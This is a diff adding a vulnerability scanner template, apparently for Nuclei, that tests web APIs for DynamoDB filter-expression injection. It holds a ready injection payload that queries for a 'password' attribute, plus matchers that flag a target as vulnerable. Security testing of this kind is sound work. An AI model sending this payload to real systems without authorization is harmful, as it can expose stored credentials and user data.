@@ -1,0 +1,26 @@
+id: nosqli-dynamodb-injection
+info:
+  name: DynamoDB Filter Expression Injection
+  author: AniipID
+  severity: high
+  description: Tests DynamoDB injection through filter expressions and attribute names
+  tags: nosqli,dynamodb,aws,injection
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/items"
+      - "{{BaseURL}}/api/dynamo/query"
+    headers:
+      Content-Type: application/json
+    body: '{"FilterExpression": "attribute_exists(#attr)", "ExpressionAttributeNames": {"#attr": "password"}}'
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Items"
+          - "Count"
+          - "ScannedCount"
+        condition: or
